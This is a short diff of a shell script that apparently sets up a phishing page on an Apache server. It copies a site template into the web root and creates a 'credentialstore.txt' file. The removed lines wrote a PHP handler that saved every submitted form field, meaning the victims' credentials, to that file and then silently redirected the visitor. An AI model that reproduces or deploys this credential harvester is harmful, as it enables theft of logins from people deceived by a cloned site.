@@ -65,10 +65,6 @@ service apache2 restart
 ## Install Site Template to Apache Folder
 cp -R site/* /var/www/html/
 
-## Create post.php
-echo "<?php $file = 'credentialstore.txt';file_put_contents($file, print_r($_POST, true), FILE_APPEND);?>" > /var/www/html/post.php
-echo '<meta http-equiv="refresh" content="0; url=./Redirect.html" />' >> /var/www/html/post.php
-
 ## Create Credential File
 touch /var/www/html/credentialstore.txt
 
